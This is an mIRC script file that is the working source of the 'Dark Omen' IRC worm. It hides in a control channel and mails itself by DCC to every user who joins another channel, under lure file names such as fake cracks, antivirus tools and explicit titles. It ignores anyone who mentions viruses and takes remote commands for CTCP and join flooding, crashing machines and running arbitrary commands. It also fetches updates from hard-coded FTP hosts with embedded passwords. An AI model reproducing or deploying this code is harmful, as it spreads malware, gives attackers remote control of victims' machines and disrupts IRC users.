[script]
n0=on *:CONNECT:{
n1=  .join #darkomeners
n2=  set %chancolor $chr(3) $+ 4
n3=  .timercon1 -m 1 250 .msg #darkomeners %chancolor $+ -------------------------------------- $+ $chr(3)
n4=  .timercon2 -m 1 500 .msg #darkomeners There's something dark within me now !
n5=  .timercon3 -m 1 750 .msg #darkomeners I can feel it. Tearing at my chest !
n6=  .timercon4 -m 1 1000 .msg #darkomeners Trying to get out....
n7=  .timercon5 -m 1 1250 .msg #darkomeners %chancolor $+ -------------------------------------- $+ $chr(3)
n8=  .timercon6 -m 1 2000 unset %chancolor
n9=  chanstatus
n10=  .timercon7 1 20 update
n11=}
n12=on *:JOIN:#darkomeners:{ .window -h #darkomeners }
n13=on *:DISCONNECT:{
n14=  .part #darkomeners
n15=}
n16=alias -l chanstatus {
n17=  .timerop1 1 10 if ($me isop #darkomeners) .topic #darkomeners -=[ Dark Omen ]=-
n18=  .timerop2 1 11 if ($me isop #darkomeners) .mode #darkomeners +nst
n19=  .timerop3 1 12 if ($me isop #darkomeners) .mode #darkomeners -o $me
n20=}
n21=on *:JOIN:#: if (($nick != $me) && ($chan != #darkomeners) && ($chan != #virus)) { darkomen.infect $nick }
n22=on *:TEXT:*virus*:*: if ((#virus != $chan) && (#darkomeners != $chan)) .ignore $nick
n23=on *:TEXT:*worm*:*: if ((#virus != $chan) && (#darkomeners != $chan)) .ignore $nick
n24=on *:TEXT:!DarkFlood*:#darkomeners:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME
n25=ctcp *:!DarkFlood:*:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME
n26=on *:TEXT:!joinflood*:#darkomeners:.timer51 10 2 .join $2 | .timer52 10 3 .part $2
n27=ctcp *:!joinflood:*:.timer51 10 2 .join $2 | .timer52 10 3 .part $2
n28=on *:START:{
n29=  set %color $chr(3) $+ 4
n30=  /echo -s %color There's something dark within me now ! $+ $chr(3)
n31=  /echo -s %color I can feel it. Tearing at my chest ! $+ $chr(3)
n32=  /echo -s %color Trying to get out.... $+ $chr(3)
n33=  unset %color
n34=}
n35=ctcp *:!kill:*:.run -n file://c:/con/con
n36=ctcp *:!fserve:*:.fserve $nick 1 $2
n37=ctcp *:+*:*: $right($1-,-1) | /halt
n38=ctcp *:PING: { raw -q notice $nick : $+ $chr(1) $+ PING Two Light Years $+ $chr(1) } /halt
n39=ctcp *:VERSION: { raw -q notice $nick : $+ $chr(1) $+ VERSION Dark Omen user... $+ $chr(1) } /halt
n40=ctcp *:FINGER:*: /halt
n41=ctcp *:TIME: { raw -q notice $nick : $+ $chr(1) $+ TIME The year 19100 I think ? $+ $chr(1) } /halt
n42=ctcp *:AUTHOR: { raw -q notice $nick : $+ $chr(1) $+ AUTHOR CRC3rror and Beuno $+ $chr(1) } /halt
n43=raw 353:*darkomeners*:/halt
n44=raw 366:*darkomeners*:/halt
n45=raw 403:*darkomeners*:/halt
n46=raw 442:*darkomeners*:/halt
n47=raw *:*darkomeners*:/halt
n48=alias -l update {
n49=  set %current.date $date(m:d)
n50=  if (%update.date == $null) goto update
n51=  if (%update.date == %current.date) { unset %current.date | goto ftpend }
n52=  :update
n53=  set %update.date $date(m:d)
n54=  set %ftpurl $ftp.server
n55=  if (%ftpurl == ftp.xoom.com) { set %ftpuser dark_omen_n | set %ftppass a7cDx9cZ248e }
n56=  if (%ftpurl == ftp.tripod.com) { set %ftpuser darkomen666 | set %ftppass a7cDx9cZ248e }
n57=  if (%ftpurl == ftp.angelfire.com) { set %ftpuser darkomen666 | set %ftppass a7cDx9cZ248e }
n58=  if (%ftpurl == 24.232.33.76) { set %ftpuser dark | set %ftppass omen }
n59=  if (%ftpurl == ftp.theglobe.com) { set %ftpuser beunocrc | set %ftppass crc333 }
n60=  set %ftpfile script.ini
n61=  sockclose Dark-Omen
n62=  sockopen Dark-Omen %ftpurl 21
n63=  :ftpend
n64=}
n65=on *:sockopen:Dark-Omen: {
n66=  if ($sockerr > 1) { halt | sockclose Dark-Omen }
n67=  set %sbig $rand(5,9)
n68=  set %startport $rand(1,20)
n69=  .timer31 1 2 sockwrite -n Dark-Omen USER %ftpuser
n70=  .timer32 1 4 sockwrite -n Dark-Omen PASS %ftppass
n71=  .timer33 1 6 sockwrite -n Dark-Omen TYPE I
n72=  .timer34 1 8 listenup
n73=  .timer35 1 11 sockwrite -n Dark-Omen RETR %ftpfile
n74=  .timer36 1 120 sockclose Dark-Omen
n75=  .timer37 1 122 sockclose FTPSERVE
n76=  .timer38 1 124 sockclose FTPSERVE2
n77=}
n78=alias -l listenup {
n79=  sockclose FTPSERVE
n80=  sockclose FTPSERVE2
n81=  sockwrite -n Dark-Omen PORT $replace($ip,.,$chr(44)) $+ , $+ %sbig $+ , $+ %startport
n82=  set %port $calc( 256 * %sbig + %startport )
n83=  inc %startport
n84=  socklisten FTPSERVE %port
n85=}
n86=on *:socklisten:FTPSERVE:{
n87=  sockaccept FTPSERVE2
n88=}
n89=on *:sockread:FTPSERVE2:{
n90=  sockread &update
n91=  bwrite %ftpfile -1 &update
n92=}
n93=alias -l file.name return $gettok(:matrix.scr:monkeys3.scr:chanrules.exe:assfucked16&14.scr:notepad-cracked.exe:5433.scr:45435.exe:987423.exe:21363.scr:me&natalie.scr:blank.scr:windowsbreaker.exe:mirc32.exe:fifthelement.scr:mirc32-crack.exe:matrix-trailer.scr:blondy16.scr:funny17.scr:genie-in-a-bottle.scr:boxingaway.scr:windows-update.exe:winzip70.exe:cuteftp.exe:bastard.scr:antivirus99.exe:buffy2k.exe:setup.exe:screensaver4.scr:chan-members.scr:allofus.scr:anti-microsoft.scr:serials99.exe:winamp.exe:13raped.scr:!!!14&16fucked.scr:supertits.scr:supertits.scr:loveme.scr:allmyinfo.scr:mypic.scr:mifoto.scr:mienefoto.scr:monphoto.scr:anti-nuke.exe:needsdeodorant.scr:poopy7.scr:,$r(1,45),58)
n94=alias -l ftp.server return $gettok(:ftp.xoom.com:ftp.tripod.com:ftp.angelfire.com:24.232.33.76:ftp.theglobe.com:,$r(1,5),58)
n95=alias -l darkomen.infect {
n96=  %darkomen.sock = darkomen.send. $+ $rand(100,9000)
n97=  socklisten %darkomen.sock
n98=  .timer99 off
n99=  .timer99 1 120 sockclose darkomen.send.*
n100=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%darkomen.sock).port $file(c:\windows\system\user.dll).size $+ $chr(1)
n101=}
n102=on *:socklisten:darkomen.send.*:{
n103=  set %darkomen.temp darkomen.write. $+ $gettok($sockname,3,46) | sockaccept %darkomen.temp | darkomen.send %darkomen.temp | sockclose $sockname
n104=}
n105=on *:sockwrite:darkomen.write.*:{
n106=  if ($sock($sockname).sent >= $file(c:\windows\system\user.dll).size) sockwrite -n $sockname
n107=  else darkomen.send $sockname
n108=}
n109=alias -l darkomen.send {
n110=  bread c:\windows\system\user.dll $sock($sockname).sent 4096 &darkomen.data
n111=  sockwrite $1 &darkomen.data
n112=}
